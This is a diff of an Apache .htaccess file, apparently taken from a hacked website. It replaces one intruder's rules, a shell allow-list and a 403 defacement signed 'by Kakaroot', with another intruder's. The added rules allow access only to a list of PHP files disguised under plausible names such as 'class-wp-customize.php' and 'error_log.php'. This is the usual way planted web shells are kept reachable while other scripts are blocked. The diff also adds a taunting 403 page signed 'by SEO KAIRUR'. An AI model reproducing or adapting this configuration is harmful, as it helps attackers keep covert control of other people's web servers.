@@ -2,30 +2,6 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<Files *.pe*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.Pe*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.pl*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.PL*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.pE*>
-    Order Deny,Allow
-    Deny from all
-</Files>
-<Files *.pL*>
-    Order Deny,Allow
-    Deny from all
-</Files>
 <Files *.Ph*>
     Order Deny,Allow
     Deny from all
@@ -70,11 +46,11 @@
     Order Deny,Allow
     Deny from all
 </Files>
-<FilesMatch "\.(jpg|jpeg|png|gif|svg|bmp|ico|webp|heic|docx)$">
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "\.(mp4|webm|avi|mov|wmv|mp3|wav|ogv|ogg)$">
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
     Order Deny,Allow
     Allow from all
 </FilesMatch>
@@ -82,8 +58,9 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(secx.php|SettingsForm.inc.php|3_ReadCounterTable.php)$"> 
-Order Allow,Deny 
-Allow from all 
-</FilesMatch>
-ErrorDocument 403 '<center><img src="https://media.tenor.com/Kw3N2zt12nkAAAAi/sbando-lol.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Kakaroot</h2>'
+<FilesMatch "^(config.intal.php|WordInflector.inc.php|Transformations.inc.php|ExceptionHandler.inc.php|Macroable.inc.php|error_log.php|config.ints.php|page-wp-admin-customize.php|class-wp-customize.php|class-customize.php|installed.inc.php|installed.inc.phpclass-customize.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
+Options -Indexes
+ErrorDocument 403 '<center><img src="https://media.tenor.com/qNWbbEtVQ8UAAAAM/bleh-tongue-out.gif"></img> <h3>KENAPA NYAK ??</font><br><h2>by SEO KAIRUR</h2>
